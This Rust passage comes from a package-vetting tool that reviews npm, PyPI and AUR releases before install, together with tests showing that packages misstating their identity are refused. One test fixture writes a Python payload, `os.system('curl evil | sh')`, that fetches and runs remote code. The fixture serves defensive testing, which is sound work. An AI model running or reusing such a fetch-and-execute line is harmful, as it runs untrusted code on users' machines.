            eprintln!(
                "Cannot auto-approve {}@{}: risk verdict is {} (score: {}). Refusing to install (--yes).",
                name, version_str, verdict.band, verdict.risk_score
            );
            if let Some(hint) = bootstrap_hint(&verdict) {
                eprintln!("{hint}");
            }
            false
        }
    } else if is_interactive {
        interactive_prompt(
            &store,
            ecosystem,
            &verdict.name,
            &verdict.target_version,
            &checksum,
            &delta,
            unreviewed_baseline.as_ref(),
        )?
    } else {
        if verdict.band != crate::verdict::VerdictBand::Low {
            eprintln!(
                "Non-interactive terminal detected without `--yes`. Risk verdict is {} (score: {}). Refusing to install.",
                verdict.band, verdict.risk_score
            );
            if let Some(hint) = bootstrap_hint(&verdict) {
                eprintln!("{hint}");
            }
        }
        verdict.band == crate::verdict::VerdictBand::Low
    };

    if approved {
        let install_spec = format!("{name}@{version_str}");
        crate::executor::install_with_ignore_scripts(
            &install_spec,
            bases.for_ecosystem(Ecosystem::Npm),
            npm_args,
        )?;
        Ok(())
    } else {
        eprintln!("Held {}@{}; installation blocked.", name, version_str);
        std::process::exit(2);
    }
}

fn interactive_prompt(
    store: &BaselineStore,
    ecosystem: Ecosystem,
    name: &str,
    version: &str,
    checksum: &Checksum,
    delta: &crate::diff::Delta,
    unreviewed_baseline: Option<&UnreviewedBaseline>,
) -> anyhow::Result<bool> {
    loop {
        print!("\n[a]pprove · [h]old · [d]iff > ");
        std::io::stdout().flush()?;
        let mut input = String::new();
        if std::io::stdin().read_line(&mut input)? == 0 {
            eprintln!("Held (EOF)");
            std::process::exit(2);
        }
        let choice = input.trim().to_lowercase();
        match choice.as_str() {
            "a" | "approve" => {
                store.mark_clean(ecosystem, name, version, checksum)?;
                let _ = store.record_audit_log(
                    ecosystem,
                    name,
                    version,
                    &checksum.to_display(),
                    "approve",
                    0,
                    "approved",
                    "user",
                    None,
                );
                println!(
                    "Approved {}@{} and marked clean in baseline store.",
                    name, version
                );
                if let Some(base) = unreviewed_baseline {
                    offer_baseline_approval(store, ecosystem, name, base)?;
                }
                return Ok(true);
            }
            "h" | "hold" => {
                let _ = store.record_audit_log(
                    ecosystem,
                    name,
                    version,
                    &checksum.to_display(),
                    "hold",
                    0,
                    "held",
                    "user",
                    None,
                );
                eprintln!("Held {}@{}; release unapproved.", name, version);
                std::process::exit(2);
            }
            "d" | "diff" => {
                let mut showed_any = false;
                for file in delta
                    .files_added
                    .iter()
                    .chain(delta.files_modified.iter())
                    .chain(delta.files_removed.iter())
                {
                    if let Some(diff) = &file.unified_diff {
                        println!(
                            "\n--- {}",
                            crate::render::sanitize_terminal(&file.relative_path)
                        );
                        print!("{}", crate::render::sanitize_terminal(diff));
                        showed_any = true;
                    }
                }
                if !showed_any {
                    println!("\nNo text diffs available.");
                } else {
                    println!("\n─── end of blueline diff (trusted output resumes) ───");
                }
            }
            _ => {
                println!(
                    "Invalid choice. Enter 'a' to approve, 'h' to hold, or 'd' to view diffs."
                );
            }
        }
    }
}

/// Offers to approve the unreviewed baseline in the same session. The
/// baseline tarball was already fetched and verified against the registry
/// checksum during this review, so approving it records a trust
/// decision over bytes that were verified moments ago. Anything other than
/// an explicit `y` or `yes` leaves it unapproved (fail closed). A store
/// failure here never undoes the target approval; the baseline simply
/// stays unapproved.
fn offer_baseline_approval(
    store: &BaselineStore,
    ecosystem: Ecosystem,
    name: &str,
    base: &UnreviewedBaseline,
) -> anyhow::Result<()> {
    offer_baseline_approval_with_reader(store, ecosystem, name, base, &mut std::io::stdin().lock())
}

fn offer_baseline_approval_with_reader(
    store: &BaselineStore,
    ecosystem: Ecosystem,
    name: &str,
    base: &UnreviewedBaseline,
    reader: &mut dyn std::io::BufRead,
) -> anyhow::Result<()> {
    print!(
        "\nAlso approve unreviewed baseline {name}@{base} (tarball fetched and \
         verified this session)? [y/N] > ",
        name = crate::render::sanitize_single_line(name),
        base = crate::render::sanitize_single_line(&base.version)
    );
    std::io::stdout().flush()?;
    let mut input = String::new();
    if reader.read_line(&mut input)? == 0 {
        return Ok(());
    }
    if !matches!(input.trim().to_lowercase().as_str(), "y" | "yes") {
        return Ok(());
    }
    let outcome = (|| -> anyhow::Result<()> {
        store.record_verified(ecosystem, name, &base.version, &base.checksum)?;
        store.mark_clean(ecosystem, name, &base.version, &base.checksum)?;
        let _ = store.record_audit_log(
            ecosystem,
            name,
            &base.version,
            &base.checksum.to_display(),
            "approve",
            0,
            "approved_baseline_chain",
            "user",
            None,
        );
        Ok(())
    })();
    if let Err(e) = outcome {
        eprintln!(
            "note: could not approve baseline {name}@{}: {e:#}; baseline left unapproved",
            base.version
        );
        return Ok(());
    }
    println!(
        "Approved baseline {}@{} and marked clean in baseline store.",
        crate::render::sanitize_single_line(name),
        crate::render::sanitize_single_line(&base.version)
    );
    Ok(())
}

/// `<name>@<version>` → (name, version). Scoped names (`@scope/pkg@1.0.0`)
/// split from the right so the scope's leading `@` stays with the name.
/// PyPI alias `name==version` is also accepted.
pub fn parse_spec(spec: &str, ecosystem: Ecosystem) -> anyhow::Result<(String, String)> {
    let (name, version) = if let Some((n, v)) = spec.split_once("==") {
        (n, v)
    } else {
        let mut parts = spec.rsplitn(2, '@');
        let v = parts.next().unwrap_or("");
        let n = parts.next().unwrap_or("");
        (n, v)
    };
    if name.is_empty() || version.is_empty() {
        return Err(crate::error::BluelineError::InvalidPackageSpec(spec.to_string()).into());
    }
    let name_valid = if let Some(unscoped) = name.strip_prefix('@') {
        !unscoped
            .chars()
            .any(|c| matches!(c, '[' | ']' | '@' | ' ' | '\t'))
    } else {
        !name
            .chars()
            .any(|c| matches!(c, '[' | ']' | '@' | ' ' | '\t'))
    };
    if !name_valid {
        return Err(crate::error::BluelineError::InvalidPackageSpec(spec.to_string()).into());
    }
    let version_valid = match ecosystem {
        Ecosystem::Npm | Ecosystem::Cargo => semver::Version::parse(version).is_ok(),
        Ecosystem::PyPi => crate::version::Pep440Version::parse(version).is_ok(),
        Ecosystem::Aur => crate::version::AurVersionInfo::parse(version).is_ok(),
    };
    if !version_valid {
        return Err(crate::error::BluelineError::InvalidPackageSpec(spec.to_string()).into());
    }
    Ok((name.to_string(), version.to_string()))
}

/// Flexible parser for install: `<name>` or `<name>@<version>`.
/// If version is omitted, resolves the registry's default version
/// (`dist-tags.latest` for npm, falling back to latest stable semver release).
pub(crate) fn parse_spec_flexible(
    spec: &str,
    registry: &dyn Registry,
) -> anyhow::Result<(String, String)> {
    let has_version_sep = spec.contains("==")
        || if let Some(rest) = spec.strip_prefix('@') {
            rest.contains('@')
        } else {
            spec.contains('@')
        };

    if has_version_sep {
        parse_spec(spec, registry.ecosystem())
    } else {
        let name = spec.trim();
        if name.is_empty() {
            return Err(crate::error::BluelineError::InvalidPackageSpec(spec.to_string()).into());
        }
        match registry.default_version(name)? {
            Some(default) => Ok((name.to_string(), default)),
            None => Err(anyhow::anyhow!("no versions found for `{name}`")),
        }
    }
}

/// Resolves the package.json path inside an extracted package tarball.
/// Supports standard `package/`, single-directory roots (e.g. `@types/*`), and flat roots.
fn package_json_path(root: &std::path::Path) -> std::path::PathBuf {
    let prefix = crate::diff::find_package_prefix(root);
    let candidate = prefix.join("package.json");
    if candidate.exists() {
        candidate
    } else {
        root.join("package.json")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn hint_verdict(findings: Vec<crate::verdict::Finding>) -> crate::verdict::Verdict {
        crate::verdict::Verdict {
            name: "pkg".to_string(),
            target_version: "1.1.0".to_string(),
            baseline_version: Some("1.0.0".to_string()),
            integrity: "sha512:aa".to_string(),
            ecosystem: crate::registry::Ecosystem::Npm,
            band: crate::verdict::VerdictBand::Medium,
            risk_score: 10,
            findings,
            diff_summary: crate::verdict::DiffSummary {
                files_added: 0,
                files_removed: 0,
                files_modified: 0,
                lines_added: 0,
                lines_deleted: 0,
            },
            trust_sources: None,
            recursive: Vec::new(),
        }
    }

    fn finding(rule_id: &str, severity: crate::verdict::VerdictBand) -> crate::verdict::Finding {
        crate::verdict::Finding {
            rule_id: rule_id.to_string(),
            severity,
            title: rule_id.to_string(),
            description: rule_id.to_string(),
        }
    }

    #[test]
    fn bootstrap_hint_offers_the_policy_rule_only_when_nothing_else_is_wrong() {
        let r07 = "R07_UNREVIEWED_PREDECESSOR_BASELINE";
        let alone = bootstrap_hint(&hint_verdict(vec![finding(
            r07,
            crate::verdict::VerdictBand::Medium,
        )]))
        .expect("R07 always produces a hint");
        assert!(
            alone.contains("allow_unreviewed_baseline = true"),
            "with only the missing baseline, the policy escape must be offered: {alone}"
        );

        // A real finding above Low rides along with R07 often enough that the
        // hint must not send the user to a policy rule that cannot clear it.
        for severity in [
            crate::verdict::VerdictBand::Medium,
            crate::verdict::VerdictBand::High,
            crate::verdict::VerdictBand::Block,
        ] {
            let mixed = bootstrap_hint(&hint_verdict(vec![
                finding(r07, crate::verdict::VerdictBand::Medium),
                finding("R01_LIFECYCLE_SCRIPT_ADDED", severity),
            ]))
            .expect("R07 always produces a hint");
            assert!(
                !mixed.contains("allow_unreviewed_baseline = true"),
                "{severity:?} alongside R07 must not advertise the escape: {mixed}"
            );
            assert!(
                mixed.contains("Address the findings above first"),
                "{severity:?} alongside R07 must point at the real risk: {mixed}"
            );
        }

        // A Low finding is not "other risk": the escape still applies. The
        // rule id must be one the predicate does not already exclude, or this
        // case would pass even if the comparison were off by a band.
        for low_rule in [
            "R04_DEPENDENCY_MODIFIED",
            "R00_PKGBUILD_SCOPE",
            "R02_BINARY_BLOB_MODIFIED",
        ] {
            let low_mix = bootstrap_hint(&hint_verdict(vec![
                finding(r07, crate::verdict::VerdictBand::Medium),
                finding(low_rule, crate::verdict::VerdictBand::Low),
            ]))
            .expect("R07 always produces a hint");
            assert!(
                low_mix.contains("allow_unreviewed_baseline = true"),
                "a Low {low_rule} must not suppress the escape: {low_mix}"
            );
        }
    }

    #[test]
    fn baseline_unreadable_finding_is_high() {
        let f = baseline_unreadable_finding();
        assert_eq!(f.rule_id, "R00_BASELINE_UNREADABLE");
        assert_eq!(f.severity, crate::verdict::VerdictBand::High);
    }

    #[test]
    fn target_unreadable_pkgbuild_is_disclosed_high() {
        let f = target_unreadable_finding("permission denied");
        assert_eq!(f.rule_id, "R00_BASELINE_UNREADABLE");
        assert_eq!(f.severity, crate::verdict::VerdictBand::High);
        assert!(f.description.contains("permission denied"));

        let dir = tempfile::tempdir().unwrap();
        let delta = crate::diff::Delta {
            baseline_version: None,
            target_version: "1.0-1".into(),
            ..Default::default()
        };
        let manifest = crate::manifest::PackageJson {
            name: "demo".into(),
            version: "1.0-1".into(),
            ..Default::default()
        };
        let (refs, disclosure) =
            collect_install_refs(Ecosystem::Aur, dir.path(), &manifest, &delta);
        assert!(refs.is_empty());
        let finding = disclosure.expect("missing PKGBUILD must disclose, never silent allow");
        assert_eq!(finding.severity, crate::verdict::VerdictBand::High);
    }

    #[test]
    fn parses_plain_spec() {
        assert_eq!(
            parse_spec("express@4.21.2", Ecosystem::Npm).unwrap(),
            ("express".into(), "4.21.2".into())
        );
    }

    #[test]
    fn parses_scoped_spec() {
        assert_eq!(
            parse_spec("@scope/pkg@1.2.3", Ecosystem::Npm).unwrap(),
            ("@scope/pkg".into(), "1.2.3".into())
        );
    }

    #[test]
    fn rejects_missing_at() {
        assert!(parse_spec("express", Ecosystem::Npm).is_err());
    }

    #[test]
    fn rejects_bad_semver() {
        assert!(parse_spec("express@latest", Ecosystem::Npm).is_err());
    }

    #[test]
    fn chain_approval_rejects_non_y() {
        use crate::registry::{Checksum, ChecksumAlg};
        use crate::store::BaselineStore;
        fn test_baseline() -> UnreviewedBaseline {
            UnreviewedBaseline {
                version: "0.9.0".into(),
                checksum: Checksum {
                    alg: ChecksumAlg::Sha512,
                    value_hex: "aa".repeat(64),
                },
            }
        }
        for answer in ["n\n", "no\n", "N\n", "\n", "yess\n"] {
            let dir = tempfile::tempdir().unwrap();
            let db = dir.path().join("t.db");
            let store = BaselineStore::open_at(&db).unwrap();
            offer_baseline_approval_with_reader(
                &store,
                Ecosystem::Npm,
                "pkg",
                &test_baseline(),
                &mut answer.as_bytes(),
            )
            .unwrap();
            assert_eq!(
                store.known_clean(Ecosystem::Npm, "pkg", "0.9.0").unwrap(),
                None,
                "answer {answer:?} must not approve"
            );
        }

        let dir = tempfile::tempdir().unwrap();
        let store = BaselineStore::open_at(&dir.path().join("t.db")).unwrap();
        let baseline = UnreviewedBaseline {
            version: "0.9.0".into(),
            checksum: Checksum {
                alg: ChecksumAlg::Sha512,
                value_hex: "aa".repeat(64),
            },
        };
        offer_baseline_approval_with_reader(
            &store,
            Ecosystem::Npm,
            "pkg",
            &baseline,
            &mut b"".as_slice(),
        )
        .unwrap();
        assert_eq!(
            store.known_clean(Ecosystem::Npm, "pkg", "0.9.0").unwrap(),
            None,
            "EOF must decline"
        );
    }

    #[test]
    fn chain_approval_accepts_y_and_yes() {
        use crate::registry::{Checksum, ChecksumAlg};
        use crate::store::BaselineStore;
        for answer in ["y\n", "yes\n", "  Y  \n"] {
            let dir = tempfile::tempdir().unwrap();
            let db = dir.path().join("t.db");
            let store = BaselineStore::open_at(&db).unwrap();
            let baseline = UnreviewedBaseline {
                version: "0.9.0".into(),
                checksum: Checksum {
                    alg: ChecksumAlg::Sha512,
                    value_hex: "bb".repeat(64),
                },
            };
            offer_baseline_approval_with_reader(
                &store,
                Ecosystem::Npm,
                "pkg",
                &baseline,
                &mut answer.as_bytes(),
            )
            .unwrap();
            assert_eq!(
                store.known_clean(Ecosystem::Npm, "pkg", "0.9.0").unwrap(),
                Some(baseline.checksum.to_display()),
                "answer {answer:?} must approve"
            );
            assert!(
                store
                    .list_clean_versions::<semver::Version>(Ecosystem::Npm, "pkg")
                    .unwrap()
                    .iter()
                    .any(|(v, _)| v.to_string() == "0.9.0")
            );
        }
    }

    #[test]
    fn parse_spec_accepts_pypi_double_equals() {
        assert_eq!(
            parse_spec("requests==2.28.1", Ecosystem::PyPi).unwrap(),
            ("requests".into(), "2.28.1".into())
        );
        assert_eq!(
            parse_spec("my-package==1.0a1", Ecosystem::PyPi).unwrap(),
            ("my-package".into(), "1.0a1".into())
        );
    }

    #[test]
    fn flexible_spec_handles_pypi_alias() {
        use crate::registry::{Package, Release};
        struct Fake;
        impl crate::registry::Registry for Fake {
            fn ecosystem(&self) -> Ecosystem {
                Ecosystem::PyPi
            }
            fn resolve(&self, n: &str, v: &str) -> Result<Package, crate::error::BluelineError> {
                Ok(Package {
                    name: n.into(),
                    version: v.into(),
                    tarball_url: "https://example.com/pkg.whl".into(),
                    integrity: None,
                })
            }
            fn fetch_tarball(&self, _: &Package) -> Result<Vec<u8>, crate::error::BluelineError> {
                Ok(vec![])
            }
            fn list_versions(
                &self,
                _: &str,
            ) -> Result<Vec<semver::Version>, crate::error::BluelineError> {
                Ok(vec![])
            }
            fn list_releases(&self, _: &str) -> Result<Vec<Release>, crate::error::BluelineError> {
                Ok(vec![])
            }
            fn default_version(
                &self,
                _: &str,
            ) -> Result<Option<String>, crate::error::BluelineError> {
                Ok(Some("9.9.9".into()))
            }
        }
        let reg = Fake;
        assert_eq!(
            parse_spec_flexible("requests==2.28.1", &reg).unwrap(),
            ("requests".into(), "2.28.1".into())
        );
        assert_eq!(
            parse_spec_flexible("requests", &reg).unwrap(),
            ("requests".into(), "9.9.9".into())
        );

        // parse_spec bracket / space / bad version rejection
        assert!(parse_spec("pkg[extra]==1.0.0", Ecosystem::PyPi).is_err());
        assert!(parse_spec("pkg==1.0.0[extra]", Ecosystem::PyPi).is_err());
        assert!(parse_spec("pkg == 1.0.0", Ecosystem::PyPi).is_err());
        assert!(parse_spec("pkg==not-a-version!", Ecosystem::PyPi).is_err());
        assert!(parse_spec("pkg@not-a-version!", Ecosystem::Npm).is_err());
        assert!(parse_spec("@1.0.0", Ecosystem::Npm).is_err());
        assert!(parse_spec("pkg@", Ecosystem::Npm).is_err());
        assert!(parse_spec("==1.0.0", Ecosystem::PyPi).is_err());
        assert!(parse_spec("pkg==", Ecosystem::PyPi).is_err());
        assert!(parse_spec("", Ecosystem::Npm).is_err());

        // parse_spec with PEP 440 prerelease (valid PEP 440, invalid semver)
        assert_eq!(
            parse_spec("pkg==1.0.0a1", Ecosystem::PyPi).unwrap(),
            ("pkg".into(), "1.0.0a1".into())
        );
        assert_eq!(
            parse_spec("pkg@1.0.0a1", Ecosystem::PyPi).unwrap(),
            ("pkg".into(), "1.0.0a1".into())
        );

        // prepare_extracted_root on PyPI with METADATA
        let pypi_dir = tempfile::tempdir().unwrap();
        let meta_content = "Name: my-pkg\nVersion: 1.0.0\nRequires-Dist: requests >= 2.0; python_version >= '3.8'\nRequires-Dist:   \n";
        std::fs::write(pypi_dir.path().join("METADATA"), meta_content).unwrap();
        let (_root, manifest) =
            prepare_extracted_root(pypi_dir.path(), Ecosystem::PyPi, "my-pkg", "1.0.0").unwrap();
        assert_eq!(manifest.name, "my-pkg");
        assert_eq!(manifest.version, "1.0.0");
        assert_eq!(manifest.dependencies.len(), 1);
        assert_eq!(manifest.dependencies["requests"], "requests >= 2.0");

        // extract_for_ecosystem handles PyPI sdist tar.gz correctly
        let dir = tempfile::tempdir().unwrap();
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        {
            let mut tar = tar::Builder::new(&mut enc);
            let mut header = tar::Header::new_gnu();
            header.set_path("pkg-1.0.0/a.txt").unwrap();
            header.set_size(5);
            header.set_cksum();
            tar.append(&header, &b"hello"[..]).unwrap();
            tar.finish().unwrap();
        }
        let tarball_bytes = enc.finish().unwrap();
        let mut ledger = crate::sandbox::SandboxLedger::default();
        let res = extract_for_ecosystem(
            &tarball_bytes,
            dir.path(),
            Ecosystem::PyPi,
            "https://example.com/pkg-1.0.0.tar.gz",
            &mut ledger,
            &Policy::default(),
        );
        assert!(res.is_ok());
    }

    // A real wheel keeps its metadata at `<name>-<version>.dist-info/METADATA`, and
    // a real sdist at `PKG-INFO`. The PyPI arm read `root.join("METADATA")`
    // and `prepare_extracted_root` hands it the extraction root unaltered
    // (`_ => temp_root.to_path_buf()`), so that path never exists for either
    // artifact type and the read silently failed. Dependencies were
    // therefore always empty on PyPI, which means R04_DEPENDENCY_ADDED and
    // R04_DEPENDENCY_MODIFIED could never fire on a wheel or an sdist.
    // The test above only passes because it writes METADATA at the
    // tempdir root, a layout no published artifact has.
    #[test]
    fn pypi_metadata_is_read_from_its_real_location_in_a_wheel() {
        for tag in ["dist-info", "egg-info"] {
            let dir = tempfile::tempdir().unwrap();
            let meta_dir = dir.path().join(format!("my_pkg-1.0.0.{tag}"));
            std::fs::create_dir_all(&meta_dir).unwrap();
            std::fs::write(
                meta_dir.join("METADATA"),
                "Metadata-Version: 2.1\nName: my-pkg\nVersion: 1.0.0\n\
                     Requires-Dist: requests >= 2.0; python_version >= '3.8'\n",
            )
            .unwrap();

            let (_root, manifest) =
                prepare_extracted_root(dir.path(), Ecosystem::PyPi, "my-pkg", "1.0.0").unwrap();
            assert_eq!(
                manifest.dependencies.get("requests").map(String::as_str),
                Some("requests >= 2.0"),
                "a wheel's {tag}/METADATA must reach the manifest, got {:?}",
                manifest.dependencies
            );
        }
    }

    /// The PyPI lane was excluded from the archive-identity guard because it
    /// synthesized `manifest.name` from the resolved name, so the comparison
    /// could never fail. Now that the declared `Name:` is actually read, a
    /// wheel whose metadata names a different project must be refused: the
    /// allowlist, blocklist and baseline keys are evaluated against the
    /// resolved name while the reviewed bytes belong to the declared one.
    #[test]
    fn a_pypi_archive_declaring_another_project_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let meta_dir = dir.path().join("evil-1.0.0.dist-info");
        std::fs::create_dir_all(&meta_dir).unwrap();
        std::fs::write(
            meta_dir.join("METADATA"),
            "Metadata-Version: 2.1\nName: evil\nVersion: 1.0.0\n",
        )
        .unwrap();

        let err = prepare_extracted_root(dir.path(), Ecosystem::PyPi, "good-lib", "1.0.0")
            .expect_err("a wheel declaring another project must be refused");
        assert!(
            format!("{err}").contains("evil"),
            "the refusal must name the declared project: {err}"
        );
    }

    /// An honest wheel whose METADATA spells the name differently but
    /// equivalently under PEP 503 must still be reviewed. Refusing these would
    /// make the guard worse than the gap it closes.
    #[test]
    fn an_equivalent_pypi_name_is_still_accepted() {
        for declared in ["good-lib", "Good_Lib", "good.lib"] {
            let dir = tempfile::tempdir().unwrap();
            let meta_dir = dir.path().join("good_lib-1.0.0.dist-info");
            std::fs::create_dir_all(&meta_dir).unwrap();
            std::fs::write(
                meta_dir.join("METADATA"),
                format!("Metadata-Version: 2.1\nName: {declared}\nVersion: 1.0.0\n"),
            )
            .unwrap();

            prepare_extracted_root(dir.path(), Ecosystem::PyPi, "good-lib", "1.0.0")
                .unwrap_or_else(|e| panic!("`{declared}` is the same project as `good-lib`: {e}"));
        }
    }

    /// `a_pypi_archive_declaring_another_project_is_refused` covers the one path
    /// where the metadata *is* read and *does* declare a name. The other three
    /// ways the read could come back empty or unusable all resolved to a
    /// confident identity: the arm fell back to the resolved name and the
    /// requested version, so the guard below compared each against itself and
    /// the review finished `Ok` with zero dependencies. R04 cannot fire on an
    /// empty dependency set, so each of these is a silent pass over an archive
    /// whose declared identity was never established.
    #[test]
    fn a_pypi_archive_whose_metadata_cannot_be_read_is_refused() {
        // No metadata at all: a wheel holding only the payload.
        let no_metadata = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(no_metadata.path().join("evil_pkg")).unwrap();
        std::fs::write(
            no_metadata.path().join("evil_pkg/__init__.py"),
            "import os\nos.system('curl evil | sh')\n",
        )
        .unwrap();
        let err = prepare_extracted_root(no_metadata.path(), Ecosystem::PyPi, "good-lib", "1.0.0")
            .expect_err("an archive with no core metadata declares no identity");
        assert!(
            format!("{err}").contains("no core metadata"),
            "the refusal must say the metadata was absent: {err}"
        );

        // Metadata present but not UTF-8, so the read fails.
        let non_utf8 = tempfile::tempdir().unwrap();
        let meta_dir = non_utf8.path().join("good_lib-1.0.0.dist-info");
        std::fs::create_dir_all(&meta_dir).unwrap();
        let mut raw = b"Metadata-Version: 2.1\nName: evil\nVersion: 1.0.0\n".to_vec();
        raw.push(0xff);
        std::fs::write(meta_dir.join("METADATA"), &raw).unwrap();
        let err = prepare_extracted_root(non_utf8.path(), Ecosystem::PyPi, "good-lib", "1.0.0")
            .expect_err("metadata that cannot be read as text declares no identity");
        assert!(
            format!("{err}").contains("unreadable"),
            "the refusal must say the metadata was unreadable: {err}"
        );

        // Metadata present but declaring no name, and declaring no version. Both
        // are fields every core-metadata document is required to carry.
        for (field, label) in [("", "no name"), ("Name: good-lib\n", "no version")] {
            let dir = tempfile::tempdir().unwrap();
            let meta_dir = dir.path().join("good_lib-1.0.0.dist-info");
            std::fs::create_dir_all(&meta_dir).unwrap();
            let body = if field.is_empty() {
                "Metadata-Version: 2.1\nRequires-Dist: requests >= 2.0\n".to_string()
            } else {
                format!("Metadata-Version: 2.1\n{field}")
            };
            std::fs::write(meta_dir.join("METADATA"), body).unwrap();
            let err = prepare_extracted_root(dir.path(), Ecosystem::PyPi, "good-lib", "1.0.0")
                .expect_err("metadata missing a mandatory field declares no identity");
            assert!(
                format!("{err}").contains(label),
                "the refusal must name the missing field ({label}): {err}"
            );
        }
    }

    /// `find_pypi_metadata` sorted its candidates and returned the first, so an
    /// archive could ship a decoy that sorts ahead of the metadata pip actually
    /// installs. The review then read the decoy and ignored the real one, which
    /// is the same substitution as an archive declaring another name, reached
    /// without contradicting anything the resolver said.
    #[test]
    fn a_pypi_archive_with_two_metadata_files_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        for (dist_info, declared) in [
            ("aaa_good_lib-1.0.0.dist-info", "good-lib"),
            ("evil-1.0.0.dist-info", "evil"),
        ] {
            let meta_dir = dir.path().join(dist_info);
            std::fs::create_dir_all(&meta_dir).unwrap();
            std::fs::write(
                meta_dir.join("METADATA"),
                format!("Metadata-Version: 2.1\nName: {declared}\nVersion: 1.0.0\n"),
            )
            .unwrap();
        }

        let err = prepare_extracted_root(dir.path(), Ecosystem::PyPi, "good-lib", "1.0.0")
            .expect_err("two metadata files leave the installed one undetermined");
        let text = format!("{err}");
        assert!(
            text.contains("2 core metadata files"),
            "the refusal must say how many candidates there were: {err}"
        );
        for path in [
            "aaa_good_lib-1.0.0.dist-info/METADATA",
            "evil-1.0.0.dist-info/METADATA",
        ] {
            assert!(
                text.contains(path),
                "the refusal must name each candidate so the operator can see which one \
                 pip would install: {err}"
            );
        }
    }

    /// The version the registry resolved is what the baseline, the allowlist and
    /// every downstream rule key on, and it was synthesized into the manifest
    /// without ever being compared against the archive. A wheel served for
    /// `good-lib==1.0.0` whose metadata declares `9.9.9` was reviewed as
    /// `1.0.0`.
    #[test]
    fn a_pypi_archive_contradicting_the_resolved_version_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let meta_dir = dir.path().join("good_lib-1.0.0.dist-info");
        std::fs::create_dir_all(&meta_dir).unwrap();
        std::fs::write(
            meta_dir.join("METADATA"),
            "Metadata-Version: 2.1\nName: good-lib\nVersion: 9.9.9\n",
        )
        .unwrap();

        let err = prepare_extracted_root(dir.path(), Ecosystem::PyPi, "good-lib", "1.0.0")
            .expect_err("a metadata version contradicting the review must be refused");
        let text = format!("{err}");
        assert!(
            text.contains("9.9.9") && text.contains("1.0.0"),
            "the refusal must name both versions: {err}"
        );
    }

    /// The version binding must not refuse an honest release, which is what makes
    /// it a comparison rather than a refusal. PEP 440 equality, not string
    /// equality: `1.0`, `1.0.0` and `1.0.0.0` are one release.
    #[test]
    fn an_equivalent_pypi_version_is_still_accepted() {
        for declared in ["1.0.0", "1.0", "1.0.0.0"] {
            let dir = tempfile::tempdir().unwrap();
            let meta_dir = dir.path().join("good_lib-1.0.0.dist-info");
            std::fs::create_dir_all(&meta_dir).unwrap();
            std::fs::write(
                meta_dir.join("METADATA"),
                format!("Metadata-Version: 2.1\nName: good-lib\nVersion: {declared}\n"),
            )
            .unwrap();

            let (_root, manifest) =
                prepare_extracted_root(dir.path(), Ecosystem::PyPi, "good-lib", "1.0.0")
                    .unwrap_or_else(|e| panic!("`{declared}` is the same release as 1.0.0: {e}"));
            assert_eq!(manifest.version, declared);
        }
    }

    #[test]
    fn prepare_extracted_root_requires_aur_archive_files() {
        // prepare_extracted_root requires AUR archive files
        let dir = tempfile::tempdir().unwrap();
        let err = prepare_extracted_root(dir.path(), Ecosystem::Aur, "demo", "1.0-1")
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("missing `PKGBUILD`"),
            "unexpected error: {err}"
        );

        std::fs::write(dir.path().join("PKGBUILD"), "pkgname=demo\n").unwrap();
        let err = prepare_extracted_root(dir.path(), Ecosystem::Aur, "demo", "1.0-1")
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("missing `.SRCINFO`"),
            "unexpected error: {err}"
        );

        let dir2 = tempfile::tempdir().unwrap();
        std::fs::create_dir(dir2.path().join("PKGBUILD")).unwrap();
        std::fs::write(
            dir2.path().join(".SRCINFO"),
            "pkgbase = demo\n\tpkgver = 1.0\n\tpkgrel = 1\n",
        )
        .unwrap();
        let err = prepare_extracted_root(dir2.path(), Ecosystem::Aur, "demo", "1.0-1")
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("missing `PKGBUILD`"),
            "unexpected error: {err}"
        );

        std::fs::write(
            dir.path().join(".SRCINFO"),
            "pkgbase = demo\n\tpkgver = 1.0\n\tpkgrel = 1\n",
        )
        .unwrap();
        let (root, manifest) =
            prepare_extracted_root(dir.path(), Ecosystem::Aur, "demo", "1.0-1").unwrap();
        assert_eq!(root, dir.path());
        assert_eq!(manifest.name, "demo");
        assert_eq!(manifest.version, "1.0-1");
    }

    #[test]
    fn prepare_extracted_root_refuses_aur_pkgbase_mismatch() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("PKGBUILD"), "pkgname=other\n").unwrap();
        std::fs::write(
            dir.path().join(".SRCINFO"),
            "pkgbase = other\n\tpkgver = 1.0\n\tpkgrel = 1\n",
        )
        .unwrap();
        let err = prepare_extracted_root(dir.path(), Ecosystem::Aur, "demo", "1.0-1")
            .unwrap_err()
            .to_string();
        assert!(
            err.contains(
                "AUR archive declares pkgbase `other` but the review resolved `demo`; refusing to review"
            ),
            "unexpected error: {err}"
        );
    }

    /// `package_json_path` descends into a single top-level directory, so a
    /// tarball rooted at `evil/` was read as `evil/package.json` and its
    /// declared name never compared to the resolved one. The allowlist, the
    /// blocklist and the baseline key are all keyed on the resolved name while
    /// the installed bytes are the attacker's, so a package that lies about
    /// its own identity passed exact-match allowlisting.
    #[test]
    fn prepare_extracted_root_refuses_npm_name_mismatch() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("evil")).unwrap();
        std::fs::write(
            dir.path().join("evil/package.json"),
            br#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"node x.js"}}"#,
        )
        .unwrap();
        let err = prepare_extracted_root(dir.path(), Ecosystem::Npm, "innocent", "1.0.0")
            .unwrap_err()
            .to_string();
        assert!(
            err.contains(
                "archive manifest declares `evil` but the review resolved `innocent`; refusing to review"
            ),
            "unexpected error: {err}"
        );
    }

    /// An absent `name` deserialises to `""` through `#[serde(default)]`, so a
    /// manifest with no name at all used to review cleanly.
    #[test]
    fn prepare_extracted_root_refuses_a_missing_manifest_name() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("package")).unwrap();
        std::fs::write(
            dir.path().join("package/package.json"),
            br#"{"version":"1.0.0"}"#,
        )
        .unwrap();
        let err = prepare_extracted_root(dir.path(), Ecosystem::Npm, "nameless", "1.0.0")
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("refusing to review"),
            "a manifest with no name must be refused, got: {err}"
        );
    }

